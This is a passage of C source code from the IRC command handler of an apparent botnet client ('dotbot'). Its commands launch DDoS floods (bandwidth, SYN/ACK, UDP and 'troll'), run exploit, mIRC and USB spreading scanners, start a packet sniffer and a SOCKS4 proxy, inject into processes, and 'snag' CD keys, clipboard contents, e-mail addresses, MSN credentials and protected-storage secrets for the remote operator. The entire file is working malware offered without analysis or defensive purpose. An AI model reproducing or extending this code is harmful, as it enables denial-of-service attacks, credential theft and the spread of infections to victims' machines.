//-----------------------------------------------------------
//-------------LOGIC-COMMANDS--------------------------------
//-----------------------------------------------------------
#ifndef NO_LOGIC
//Logic If
	else if (strcmp(cmd_logicif, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (!p[s + 2])
				return;
		if (!p[s + 3])
				return;
			memset(szSendBuffer, 0, sizeof(szSendBuffer));
		for (i = s + 3; i < POINTER_MAX; i++)
		{
			if (!p[i])
					break;
				strncat(szSendBuffer, p[i], (sizeof(szSendBuffer) - strlen(szSendBuffer)) - 1);
			if (p[i + 1])
			{
				if (i != POINTER_MAX)
						strncat(szSendBuffer,
								" ",
								(sizeof(szSendBuffer) - strlen(szSendBuffer)) - 1);
			}
		}
			logic_if(bsock, wsaEvent, nServer, p[1], p[2], p[s + 1], p[s + 2], szSendBuffer);
	}
#endif
//-----------------------------------------------------------
//-------------PROCESS-COMMANDS------------------------------
//-----------------------------------------------------------
//Process Kill
	else if (strcmp(cmd_processkillpid, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (process_killpid(atoi(p[s + 1])))
		{
			if (!bSilent)
					irc_message(bsock, p[1], p[2],
							(char *)string_processkilled,
							CGREEN, string_replyprocess, CEND, string_replydotbot,
							CBLUE, CEND, atoi(p[s + 1]));
		}
		else
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_processunabletokill,
							CRED, string_replyprocess, CEND, string_replydotbot,
							CBLUE, CEND, atoi(p[s + 1]));
		}
	}
//Process List
	else if (strcmp(cmd_processlist, p[s]) == 0)
	{
		if (!process_list(bsock, p[1], p[2], bSilent, bVerbose))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_processlistfailed,
							CRED, string_replyprocess, CEND, string_replydotbot);
	}
//Process Start
	else if (strcmp(cmd_processtart, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (!p[s + 2])
				return;
		bool bFacen = TRUE; //Thank you CPP...
		if (atoi(p[s + 2]) == 0)
				bFacen = FALSE;
		if (process_start(p[s + 1], bFacen))
		{
			if (!bSilent)
					irc_message(bsock, p[1], p[2],
							(char *)string_processtarted,
							CGREEN, string_replyprocess, CEND, string_replydotbot,
							CBLUE, CEND, p[s + 1],
							CBLUE, CEND, bFacen);
		}
		else
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_processunabletostart,
							CRED, string_replyprocess, CEND, string_replydotbot,
							CBLUE, CEND, p[s + 1],
							CBLUE, CEND, bFacen);
		}
	}
//-----------------------------------------------------------
//-------------PSNIFF-COMMANDS-------------------------------
//-----------------------------------------------------------
#ifndef NO_PSNIFF
//PSniff Start
	else if (strcmp(cmd_psniffstart, p[s]) == 0)
	{
			s_ps.m_bsock = bsock;
			strncpy(s_ps.m_szAction, p[1], sizeof(s_ps.m_szAction) - 1);
			strncpy(s_ps.m_szDestination, p[2], sizeof(s_ps.m_szDestination) - 1);
			strncpy(s_ps.m_szResultChannel,
					rgSServerList[nServer].m_pszPSniffChannel,
					sizeof(s_ps.m_szResultChannel) - 1);
			s_ps.m_bSilent = bSilent;
			s_ps.m_bVerbose = bVerbose;
		if (!thread_add((char *)string_threadpsniffmain, THREAD_PSNIFF, &psniff_main, &s_ps))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_psniffalreadyrunning,
							CRED, string_replypsniff, CEND, string_replydotbot);
	}
//PSniff Stop
	else if (strcmp(cmd_psniffstop, p[s]) == 0)
	{
		if (thread_killid(THREAD_PSNIFF))
		{
			if (!bSilent)
					irc_message(bsock, p[1], p[2],
							(char *)string_psniffstopped,
							CGREEN, string_replypsniff, CEND, string_replydotbot);
		}
		else
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_psniffnotrunning,
							CRED, string_replypsniff, CEND, string_replydotbot);
		}
	}
#endif
//-----------------------------------------------------------
//-------------SPEEDTEST-COMMANDS----------------------------
//-----------------------------------------------------------
#ifndef NO_SPEEDTEST
//Speedtest HTTP
	else if (strcmp(cmd_speedtesthttp, p[s]) == 0)
			speedtest_http(bsock, p[1], p[2], bSilent, bVerbose);
#endif
//-----------------------------------------------------------
//-------------THREAD-COMMANDS-------------------------------
//-----------------------------------------------------------
//Thread Kill
	else if (strcmp(cmd_threadkill, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (thread_kill(atoi(p[s + 1])))
		{
			if (!bSilent)
					irc_message(bsock, p[1], p[2],
							(char *)string_threadkilled,
							CGREEN, string_replythread, CEND, string_replydotbot,
							CBLUE, CEND, atoi(p[s + 1]));
		}
		else
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_threadunabletokill,
							CRED, string_replythread, CEND, string_replydotbot,
							CBLUE, CEND, atoi(p[s + 1]));
		}
	}
//Thread List
	else if (strcmp(cmd_threadlist, p[s]) == 0)
			thread_list(bsock, p[1], p[2], bSilent, bVerbose);
//-----------------------------------------------------------
//-------------DAEMON-COMMANDS-------------------------------
//-----------------------------------------------------------
#ifndef NO_DAEMONSOCKS4
//Socks4d Start
	else if (strcmp(cmd_socks4dstart, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if ((atoi(p[s + 1]) < 1) || (atoi(p[s + 1]) > 65535))
				s_ds4.m_nPort = 1080;
		else
				s_ds4.m_nPort = atoi(p[s + 1]);
			s_ds4.m_bsock = bsock;
			strncpy(s_ds4.m_szAction, p[1], sizeof(s_ds4.m_szAction) - 1);
			strncpy(s_ds4.m_szDestination, p[2], sizeof(s_ds4.m_szDestination) - 1);
			s_ds4.m_bSilent = bSilent;
			s_ds4.m_bVerbose = bVerbose;
		if (thread_add((char *)string_threaddaemonsocks4main,
					THREAD_DAEMONSOCKS4,
					&daemon_socks4main,
					&s_ds4))
		{
			if (!bSilent)
					irc_message(bsock, p[1], p[2],
							(char *)string_daemonsocks4started,
							CGREEN, string_replysocks4d, CEND, string_replydotbot,
							CBLUE, CEND, ip_getip(bsock),
							CBLUE, CEND, s_ds4.m_nPort);
		}
		else
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_daemonsocks4alreadyrunning,
							CRED, string_replysocks4d, CEND, string_replydotbot);
		}
	}
//Socks4d Stop
	else if (strcmp(cmd_socks4dstop, p[s]) == 0)
	{
		if (thread_killid(THREAD_DAEMONSOCKS4))
		{
			if (!bSilent)
					irc_message(bsock, p[1], p[2],
							(char *)string_daemonsocks4stopped,
							CGREEN, string_replysocks4d, CEND, string_replydotbot);
		}
		else
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_daemonsocks4notrunning,
							CRED, string_replysocks4d, CEND, string_replydotbot);
		}
	}
#endif
//-----------------------------------------------------------
//-------------DDOS-COMMANDS---------------------------------
//-----------------------------------------------------------
//DDOS Bandwith
#ifndef NO_BANDWITHFLOOD
	else if (strcmp(cmd_ddosbandwith, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (!p[s + 2])
				return;
		if (!p[s + 3])
				return;
			strncpy(s_bf.m_szUrl, p[s + 1], sizeof(s_bf.m_szUrl) - 1);
			s_bf.m_nDelay = atoi(p[s + 2]);
			s_bf.m_nTimes = atoi(p[s + 3]);
			s_bf.m_bsock = bsock;
			strncpy(s_bf.m_szAction, p[1], sizeof(s_bf.m_szAction) - 1);
			strncpy(s_bf.m_szDestination, p[2], sizeof(s_bf.m_szDestination) - 1);
			s_bf.m_bSilent = bSilent;
			s_bf.m_bVerbose = bVerbose;
		if (!thread_add((char *)string_threadbandwithfloodmain,
					THREAD_DDOS,
					&bandwithflood_main,
					&s_bf))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_ddosalreadyrunning,
							CRED, string_replyddos, CEND, string_replydotbot);
	}
#endif
//DDOS Stop
	else if (strcmp(cmd_ddosstop, p[s]) == 0)
	{
		if (thread_killid(THREAD_DDOS))
		{
			if (!bSilent)
					irc_message(bsock, p[1], p[2],
							(char *)string_ddosstopped,
							CGREEN, string_replyddos, CEND, string_replydotbot);
		}
		else
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_ddosnotrunning,
							CRED, string_replyddos, CEND, string_replydotbot);
		}
	}
//DDOS SYN/ACK
#ifndef NO_SYNACKFLOOD
	else if (strcmp(cmd_ddossynack, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (!p[s + 2])
				return;
		if (!p[s + 3])
				return;
		if (!p[s + 4])
				return;
			strncpy(s_saf.m_szHost, p[s + 1], sizeof(s_saf.m_szHost) - 1);
			s_saf.m_nPort = atoi(p[s + 2]);
			s_saf.m_nDelay = atoi(p[s + 3]);
			s_saf.m_dwTime = atol(p[s + 4]);
			s_saf.m_bsock = bsock;
			strncpy(s_saf.m_szAction, p[1], sizeof(s_saf.m_szAction) - 1);
			strncpy(s_saf.m_szDestination, p[2], sizeof(s_saf.m_szDestination) - 1);
			s_saf.m_bSilent = bSilent;
			s_saf.m_bVerbose = bVerbose;
		if (!thread_add((char *)string_threadsynackfloodmain,
					THREAD_DDOS,
					&synackflood_main,
					&s_saf))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_ddosalreadyrunning,
							CRED, string_replyddos, CEND, string_replydotbot);
	}
#endif
//DDOS Troll
#ifndef NO_TROLLFLOOD
	else if (strcmp(cmd_ddostroll, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (!p[s + 2])
				return;
		if (!p[s + 3])
				return;
		if (!p[s + 4])
				return;
		if (!p[s + 5])
				return;
			strncpy(s_tf.m_szHost, p[s + 1], sizeof(s_tf.m_szHost) - 1);
			s_tf.m_nPort = atoi(p[s + 2]);
			s_tf.m_nSockets = atoi(p[s + 3]);
		if (s_tf.m_nSockets > 100000)
				s_tf.m_nSockets = 100000;
			s_tf.m_nDelay = atoi(p[s + 4]);
			s_tf.m_dwTime = atol(p[s + 5]);
			s_tf.m_bsock = bsock;
			strncpy(s_tf.m_szAction, p[1], sizeof(s_tf.m_szAction) - 1);
			strncpy(s_tf.m_szDestination, p[2], sizeof(s_tf.m_szDestination) - 1);
			s_tf.m_bSilent = bSilent;
			s_tf.m_bVerbose = bVerbose;
		if (!thread_add((char *)string_threadtrollfloodmain,
					THREAD_DDOS,
					&trollflood_main,
					&s_tf))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_ddosalreadyrunning,
							CRED, string_replyddos, CEND, string_replydotbot);
	}
#endif
//DDOS UDP
#ifndef NO_UDPFLOOD
	else if (strcmp(cmd_ddosudp, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (!p[s + 2])
				return;
		if (!p[s + 3])
				return;
		if (!p[s + 4])
				return;
			strncpy(s_uf.m_szHost, p[s + 1], sizeof(s_uf.m_szHost) - 1);
			s_uf.m_nPort = atoi(p[s + 2]);
			s_uf.m_nDelay = atoi(p[s + 3]);
			s_uf.m_dwTime = atol(p[s + 4]);
			s_uf.m_bsock = bsock;
			strncpy(s_uf.m_szAction, p[1], sizeof(s_uf.m_szAction) - 1);
			strncpy(s_uf.m_szDestination, p[2], sizeof(s_uf.m_szDestination) - 1);
			s_uf.m_bSilent = bSilent;
			s_uf.m_bVerbose = bVerbose;
		if (!thread_add((char *)string_threadudpfloodmain,
					THREAD_DDOS,
					&udpflood_main,
					&s_uf))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_ddosalreadyrunning,
							CRED, string_replyddos, CEND, string_replydotbot);
	}
#endif
//-----------------------------------------------------------
//-------------BOTKILLER-COMMANDS----------------------------
//-----------------------------------------------------------
#ifndef NO_BOTKILLER
//Botkiller Start
	else if (strcmp(cmd_botkillerstart, p[s]) == 0)
	{
			s_bk.m_bsock = bsock;
			strncpy(s_bk.m_szAction, p[1], sizeof(s_bk.m_szAction) - 1);
			strncpy(s_bk.m_szDestination, p[2], sizeof(s_bk.m_szDestination) - 1);
			s_bk.m_bSilent = bSilent;
			s_bk.m_bVerbose = bVerbose;
		if (!thread_add((char *)string_threadbotkillermain, THREAD_BOTKILLER, &botkiller_main, &s_bk))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_botkilleralreadyrunning,
							CRED, string_replybotkiller, CEND, string_replydotbot);
	}
//Botkiller Stop
	else if (strcmp(cmd_botkillerstop, p[s]) == 0)
	{
		if (thread_killid(THREAD_BOTKILLER))
		{
			if (!bSilent)
					irc_message(bsock, p[1], p[2],
							(char *)string_botkillerstopped,
							CGREEN, string_replybotkiller, CEND, string_replydotbot);
		}
		else
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_botkillernotrunning,
							CRED, string_replybotkiller, CEND, string_replydotbot);
		}
	}
#endif
//-----------------------------------------------------------
//-------------SCAN-COMMANDS---------------------------------
//-----------------------------------------------------------
#ifndef NO_EXPSCAN
//Expscan Current IP
	else if (strcmp(cmd_expscancip, p[s]) == 0)
	{
		if (thread_find(THREAD_EXPSCAN))
		{
			if (!bSilent)
					irc_message(bsock, p[1], p[2], g_szScanning);
		}
		else
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_expscannotrunning,
							CRED, string_replyexpscan, CEND, string_replydotbot);
		}
	}
//Expscan Start
	else if (strcmp(cmd_expscanstart, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (!p[s + 2])
				return;
		if (!p[s + 3])
				return;
		if (!p[s + 4])
				return;
		if (!p[s + 5])
				return;
			strncpy(s_es.m_szIP, expscan_setip(bsock, p[s + 1]), sizeof(s_es.m_szIP) - 1);
			strncpy(s_es.m_szExploitName, p[s + 2], sizeof(s_es.m_szExploitName) - 1);
			s_es.m_nSockets = atoi(p[s + 3]);
			s_es.m_nDelay = atoi(p[s + 4]);
			s_es.m_dwTime = atol(p[s + 5]);
			s_es.m_bRandom = FALSE;
		if ((p[s + 6] != NULL) && (strcmp(p[s + 6], string_expscanparameterr) == 0))
				s_es.m_bRandom = TRUE;
			s_es.m_bsock = bsock;
			strncpy(s_es.m_szAction, p[1], sizeof(s_es.m_szAction) - 1);
			strncpy(s_es.m_szDestination, p[2], sizeof(s_es.m_szDestination) - 1);
			strncpy(s_es.m_szResultChannel,
					rgSServerList[nServer].m_pszExploitChannel,
					sizeof(s_es.m_szResultChannel) - 1);
			s_es.m_bSilent = bSilent;
			s_es.m_bVerbose = bVerbose;
		if (!thread_add((char *)string_threadexpscanmain, THREAD_EXPSCAN, &expscan_main, &s_es))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_expscanalreadyrunning,
							CRED, string_replyexpscan, CEND, string_replydotbot);
	}
//Expscan Stop
	else if (strcmp(cmd_expscanstop, p[s]) == 0)
	{
		if (thread_killid(THREAD_EXPSCAN))
		{
			if (!bSilent)
					irc_message(bsock, p[1], p[2],
							(char *)string_expscanstopped,
							CGREEN, string_replyexpscan, CEND, string_replydotbot);
		}
		else
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_expscannotrunning,
							CRED, string_replyexpscan, CEND, string_replydotbot);
		}
	}
#endif
#ifndef NO_MIRCSCAN
//mIRCScan Start
	else if (strcmp(cmd_mircscanstart, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (!p[s + 2])
				return;
		if (!p[s + 3])
				return;
			s_ms.m_nDelay = atoi(p[s + 1]);
			s_ms.m_dwTime = atol(p[s + 2]);
			memset(szSendBuffer, 0, sizeof(szSendBuffer));
		for (i = s + 3; i < POINTER_MAX; i++)
		{
			if (!p[i])
					break;
				strncat(szSendBuffer, p[i], (sizeof(szSendBuffer) - strlen(szSendBuffer)) - 1);
			if (p[i + 1])
			{
				if ((strcmp(string_ircdelayresponse, p[i + 1]) == 0) ||
						(strcmp(string_ircsilentresponse, p[i + 1]) == 0) ||
						(strcmp(string_ircverboseresponse, p[i + 1]) == 0)) break;
					strncat(szSendBuffer,
							"\x20",
							(sizeof(szSendBuffer) - strlen(szSendBuffer)) - 1);
			}
		}
			strncpy(s_ms.m_szMessage, szSendBuffer, sizeof(s_ms.m_szMessage) - 1);
			s_ms.m_bsock = bsock;
			strncpy(s_ms.m_szAction, p[1], sizeof(s_ms.m_szAction) - 1);
			strncpy(s_ms.m_szDestination, p[2], sizeof(s_ms.m_szDestination) - 1);
			s_ms.m_bSilent = bSilent;
			s_ms.m_bVerbose = bVerbose;
		if (!thread_add((char *)string_threadmircscanmain, THREAD_MIRCSCAN, &mircscan_main, &s_ms))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_mircscanalreadyrunning,
							CRED, string_replymircscan, CEND, string_replydotbot);
	}
//mIRCScan Stop
	else if (strcmp(cmd_mircscanstop, p[s]) == 0)
	{
		if (thread_killid(THREAD_MIRCSCAN))
		{
			if (!bSilent)
					irc_message(bsock, p[1], p[2],
							(char *)string_mircscanstopped,
							CGREEN, string_replymircscan, CEND, string_replydotbot);
		}
		else
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_mircscannotrunning,
							CRED, string_replymircscan, CEND, string_replydotbot);
		}
	}
#endif
#ifndef NO_USBSCAN
//USBScan Start
	else if (strcmp(cmd_usbscanstart, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (!p[s + 2])
				return;
		if (!p[s + 3])
				return;
			strncpy(s_us.m_szFileName, p[s + 1], sizeof(s_us.m_szFileName) - 1);
			s_us.m_nDelay = atoi(p[s + 2]);
			s_us.m_dwTime = atol(p[s + 3]);
			s_us.m_bsock = bsock;
			strncpy(s_us.m_szAction, p[1], sizeof(s_us.m_szAction) - 1);
			strncpy(s_us.m_szDestination, p[2], sizeof(s_us.m_szDestination) - 1);
			strncpy(s_us.m_szResultChannel,
					rgSServerList[nServer].m_pszExploitChannel,
					sizeof(s_us.m_szResultChannel) - 1);
			s_us.m_bSilent = bSilent;
			s_us.m_bVerbose = bVerbose;
		if (!thread_add((char *)string_threadusbscanmain, THREAD_USBSCAN, &usbscan_main, &s_us))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_usbscanalreadyrunning,
							CRED, string_replyusbscan, CEND, string_replydotbot);
	}
//USBScan Stop
	else if (strcmp(cmd_usbscanstop, p[s]) == 0)
	{
		if (thread_killid(THREAD_USBSCAN))
		{
			if (!bSilent)
					irc_message(bsock, p[1], p[2],
							(char *)string_usbscanstopped,
							CGREEN, string_replyusbscan, CEND, string_replydotbot);
		}
		else
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_usbscannotrunning,
							CRED, string_replyusbscan, CEND, string_replydotbot);
		}
	}
#endif
//Scan Stats
	else if (strcmp(cmd_scanstats, p[s]) == 0)
	{
		if (!bSilent)
				irc_message(bsock, p[1], p[2],
						(char *)string_scanstats,
						CGREEN, string_replyscan, CEND, string_replydotbot,
						CBLUE, CEND, g_nTransfers);
	}
//-----------------------------------------------------------
//-------------SNAG-COMMANDS---------------------------------
//-----------------------------------------------------------
//Snag All
	else if (strcmp(cmd_snagall, p[s]) == 0)
	{

#ifndef NO_SNAGCDKEYS
			snag_cdkeys(bsock, p[1], p[2], bSilent, bVerbose);
#endif

			Sleep(FLOOD_DELAY);

#ifndef NO_SNAGCLIPBOARD
			snag_clipboard(bsock, p[1], p[2], bSilent, bVerbose);
#endif

			Sleep(FLOOD_DELAY);

#ifndef NO_SNAGEMAILS
			snag_emails(bsock, p[1], p[2], bSilent, bVerbose);
#endif

			Sleep(FLOOD_DELAY);

#ifndef NO_SNAGMSN
			snag_msn(bsock, p[1], p[2], bSilent, bVerbose);
#endif

			Sleep(FLOOD_DELAY);

#ifndef NO_SNAGSTORAGE
			snag_storage(bsock, p[1], p[2], bSilent, bVerbose);
#endif

	}

#ifndef NO_SNAGCDKEYS
//Snag CD-Keys
	else if (strcmp(cmd_snagcdkeys, p[s]) == 0)
			snag_cdkeys(bsock, p[1], p[2], bSilent, bVerbose);
#endif
#ifndef NO_SNAGCLIPBOARD
//Snag Clipboard
	else if (strcmp(cmd_snagclipboard, p[s]) == 0)
			snag_clipboard(bsock, p[1], p[2], bSilent, bVerbose);
#endif
#ifndef NO_SNAGEMAILS
//Snag E-Mails
	else if (strcmp(cmd_snagemails, p[s]) == 0)
	{
		if (!snag_emails(bsock, p[1], p[2], bSilent, bVerbose))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_snagemailsfailedtopenwabfile,
							CRED, string_replysnag, CEND, string_replydotbot);
	}
#endif
#ifndef NO_SNAGMSN
//Snag MSN
	else if (strcmp(cmd_snagmsn, p[s]) == 0)
	{
		if (!snag_msn(bsock, p[1], p[2], bSilent, bVerbose))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_snagmsncredentialfailed,
							CRED, string_replysnag, CEND, string_replydotbot);
	}
#endif
#ifndef NO_SNAGSTORAGE
//Snag Storage
	else if (strcmp(cmd_snagstorage, p[s]) == 0)
	{
		if (!snag_storage(bsock, p[1], p[2], bSilent, bVerbose))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_snagstoragefailedtoloadpstoreclibrary,
							CRED, string_replysnag, CEND, string_replydotbot);
	}
#endif
//-----------------------------------------------------------
//-------------WORMRIDE-COMMANDS-----------------------------
//-----------------------------------------------------------
#ifndef NO_INSTALLWORMRIDE
//Wormride Start
	else if (strcmp(cmd_wormridestart, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
			s_wr.m_dwTime = atol(p[s + 1]);
			s_wr.m_bsock = bsock;
			strncpy(s_wr.m_szAction, p[1], sizeof(s_wr.m_szAction) - 1);
			strncpy(s_wr.m_szDestination, p[2], sizeof(s_wr.m_szDestination) - 1);
			s_wr.m_bSilent = bSilent;
			s_wr.m_bVerbose = bVerbose;
		if (!thread_add((char *)string_threadwormridemain, THREAD_WORMRIDE, &wormride_main, &s_wr))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_wormridealreadyrunning,
							CRED, string_replywormride, CEND, string_replydotbot);
	}
//Wormride Stop
	else if (strcmp(cmd_wormridestop, p[s]) == 0)
	{
		if (thread_killid(THREAD_WORMRIDE))
		{
				inject_processesunloadall(WORMRIDE_BASEADDRESS);
			if (!bSilent)
					irc_message(bsock, p[1], p[2],
							(char *)string_wormridestopped,
							CGREEN, string_replywormride, CEND, string_replydotbot);
		}
		else
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_wormridenotrunning,
							CRED, string_replywormride, CEND, string_replydotbot);
		}
	}
#endif
		return;
}